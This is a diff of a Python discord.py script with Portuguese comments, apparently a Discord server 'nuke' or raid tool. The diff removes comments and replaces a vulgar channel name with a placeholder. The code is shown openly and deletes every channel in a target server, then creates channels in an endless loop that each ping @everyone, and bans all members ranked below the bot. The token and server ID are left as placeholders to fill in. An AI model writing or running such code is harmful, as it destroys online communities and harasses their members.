@@ -5,7 +5,6 @@ TOKEN = 'token da conta'
  
 GUILD_ID = id do servidor
 
-# Crie uma instância do cliente
 client = discord.Client()
 
 @client.event
@@ -17,7 +16,6 @@ async def on_ready():
         print("Servidor não encontrado!")
         return
 
-    # Deletar todos os canais
     for channel in guild.channels:
         try:
             await channel.delete()
@@ -28,16 +26,16 @@ async def on_ready():
     async def create_channels():
         while True:
             try:
-                new_channel = await guild.create_text_channel('range pau no cu')
+                new_channel = await guild.create_text_channel('NOME DO CANAL')
                 print(f'Created a new channel: {new_channel.name}')
                 
                 await new_channel.send('@everyone')
                 print('Sent message mentioning @everyone.')
                 
-                await asyncio.sleep(00.1)  # Ajuste o intervalo conforme necessário
+                await asyncio.sleep(00.1)
             except Exception as e:
                 print(f'Failed to create channel or send message: {e}')
-                await asyncio.sleep(00.1)  # Pausa em caso de erro para evitar sobrecarregar a API
+                await asyncio.sleep(00.1)
 
     async def ban_members():
         bot_member = guild.get_member(client.user.id)
@@ -53,7 +51,6 @@ async def on_ready():
             if member == bot_member:
                 continue
 
-            # Verificar se o cargo do membro é inferior ao do bot
             if member.top_role.position < bot_role.position:
                 try:
                     await member.ban(reason="Banned by bot.")
@@ -67,10 +64,8 @@ async def on_ready():
                 except Exception as e:
                     print(f'Failed to ban member {member.name}: {e}')
                 
-                await asyncio.sleep(00.1)  # Pausa entre banimentos para evitar rate limiting
+                await asyncio.sleep(00.1)
 
-    # Execute as funções em paralelo
     await asyncio.gather(create_channels(), ban_members())
 
-# Execute o bot
 client.run("token da conta")
